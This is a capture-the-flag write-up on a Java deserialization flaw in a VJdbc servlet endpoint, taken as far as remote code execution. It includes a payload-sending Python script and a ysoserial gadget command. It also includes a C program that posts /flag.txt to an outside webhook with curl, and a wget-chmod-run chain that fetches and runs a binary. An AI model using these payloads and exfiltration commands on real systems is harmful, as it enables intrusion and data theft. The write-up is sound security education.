---
title: "EGCERT-CTF JDBCLeak Exploit"
header:
  teaser: "/assets/images/CTFs/MISC/cert_header.jpg"
classes: wide
tags: ["CTF", "Java-Deserialization", "RCE"]
date: 2025-05-29T12:49:18+34:08
toc: true
draft: false
categories:
  - Code Review
ribbon: pink
---

*JDBCLeak Leak was a challenge introducted in EGCERT CTF Finals 2025 under the category R&D , tbh i didn't even look at the challenge during CTF Time , didn't expect this category to introduce such good example of a real case code review challenge , however after reading the author's blog [here](https://bitthebyte.medium.com/here-is-what-you-missed-during-the-egcert-ctf-2025-finals-927297143d9a) about the category and challenge i thought of trying it myself and create a POC for it to get rce reading /flag.txt , we got 3rd place btw :"D*



<!--more-->

## Basic Code analysis

as already explained by the author we start with the `web.xml` file as it contains the routes and mappes servlets (which is the codebase mapped to the route) which contains the following 
- `/vjdbc` endpoint has servlet `VJdbcServlet`
- `VJdbcServlet` servlet is mapped to class `de.simplicit.vjdbc.server.servlet.ServletCommandSink` which should be our start point.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE web-app
    PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
    "http://java.sun.com/dtd/web-app_2_3.dtd">

<web-app>
    <display-name>VJdbcServlet</display-name>
    <description>Servlet for using VJdbc over HTTP</description>

    <servlet>
        <servlet-name>VJdbcServlet</servlet-name>
        <servlet-class>de.simplicit.vjdbc.server.servlet.ServletCommandSink</servlet-class>
        <init-param>
			<param-name>config-resource</param-name>
			<param-value>/WEB-INF/config/vjdbc-config.xml</param-value>
		</init-param>
    </servlet>
    
    <servlet-mapping>
        <servlet-name>VJdbcServlet</servlet-name>
        <url-pattern>/vjdbc</url-pattern>
    </servlet-mapping>
</web-app>
```

The code base is not really that big and can easily identify the `readObject` function used multiple times


```java
    private void handleRequest(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException {
        ObjectInputStream ois = null;
        ObjectOutputStream oos = null;

        try {
            // Get the method to execute
            String method = httpServletRequest.getHeader(ServletCommandSinkIdentifier.METHOD_IDENTIFIER);

            if(method != null) {
                ois = new ObjectInputStream(httpServletRequest.getInputStream());
                // And initialize the output
                OutputStream os = httpServletResponse.getOutputStream();
                oos = new ObjectOutputStream(os);
                Object objectToReturn = null;

                try {
                    // Some command to process ?
                    if(method.equals(ServletCommandSinkIdentifier.PROCESS_COMMAND)) {
                        // Read parameter objects
                        Long connuid = (Long) ois.readObject(); // BUG
                        Long uid = (Long) ois.readObject(); // BUG
                        Command cmd = (Command) ois.readObject(); // BUG
                        CallingContext ctx = (CallingContext) ois.readObject(); // BUG
                        // Delegate execution to the CommandProcessor
                        objectToReturn = _processor.process(connuid, uid, cmd, ctx);
                    } else if(method.equals(ServletCommandSinkIdentifier.CONNECT_COMMAND)) {
                        String url = ois.readUTF();
                        Properties props = (Properties) ois.readObject(); // BUG
                        Properties clientInfo = (Properties) ois.readObject(); // BUG
                        CallingContext ctx = (CallingContext) ois.readObject(); // BUG
```

As shown we have to pass the check `if(method.equals(ServletCommandSinkIdentifier.PROCESS_COMMAND))` to send our serialized object raw format to be deserilaized. 

the method variable value is from `METHOD_IDENTIFIER` , searching for it will find it is :

```java
// java\de\simplicit\vjdbc\servlet\ServletCommandSinkIdentifier.java
public interface ServletCommandSinkIdentifier {
    public static final String METHOD_IDENTIFIER = "vjdbc-method";
    public static final String CONNECT_COMMAND = "connect";
    public static final String PROCESS_COMMAND = "process";
}
```

and the `PROCESS_COMMAND` is simply `process` so we have to send the following headers to `/vjdbc`

```
Content-Type: binary/x-java-serialized
vjdbc-method: process
```

sending GET or POST will both call the target function `handleRequest` 
```java
    protected void doGet(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException {
        handleRequest(httpServletRequest, httpServletResponse);
    }

    protected void doPost(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException {
        handleRequest(httpServletRequest, httpServletResponse);
    }
```

## Exploiting Virtual JDBC

I have made a simple script to send the raw payload and will use it in sending any payload 

```python
import requests
import sys

def send_bin_payload(url, bin_file_path):
    headers = {
        'Content-Type': 'binary/x-java-serialized',
        'vjdbc-method': 'process'
    }
    
    try:
        with open(bin_file_path, 'rb') as f:
            payload = f.read()
        
        response = requests.post(url, headers=headers, data=payload)
        
        print(f"Status Code: {response.status_code}")
        print(f"Response Headers: {response.headers}")
        try:
            print(f"Response Content: {response.content}")
        except:
            print("Could not decode response content")
            
        return response
        
    except Exception as e:
        print(f"Error: {str(e)}")
        return None

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python script.py <target_url> <bin_file_path> [method]")
        print("Example: python script.py http://target/vjdbc payload.bin process")
        sys.exit(1)
        
    target_url = sys.argv[1]
    bin_file = sys.argv[2]
    send_bin_payload(target_url, bin_file)
    print("done !")
```

Now testing the vulnerability , the app imports alot of apache libraries which seems good time to try [ysoserial](https://github.com/frohoff/ysoserial) common collections gadgets payloads

```java
import org.apache.commons.*
```

Trying Generate multiple payloads using common collections 1,2,..7 until this one workd *this java options just for openjdk version 17 you may not need them*

```bash
java \                                                           
 --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED\
 --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED\
 --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED\
 -jar ~/tools/ysoserial.jar CommonsCollections7 "curl https://webhook.site/0ea96080-c341-4e98-ab42-9557ecfd95e7" > shell.bin
```
then run the script will get a call back , now to get the flag.txt content tried multiple payloads but there was some issues so i generated a binary and executed it eventually

### Generate a payload

```C++
#include <stdlib.h>

int main() {
    system("curl -X POST -F 'file=@/flag.txt' https://webhook.site/0ea96080-c341-4e98-ab42-9557ecfd95e7");
    return 0;
}
// compile with
gcc test.c -o test
```

Now will generate 3 java serilaized objects and run the python script for each to get the final flag

```bash
wget http://server/test
chmod +x ./test
./test
```

![image](/assets/images/CTFs/MISC/POC.png)

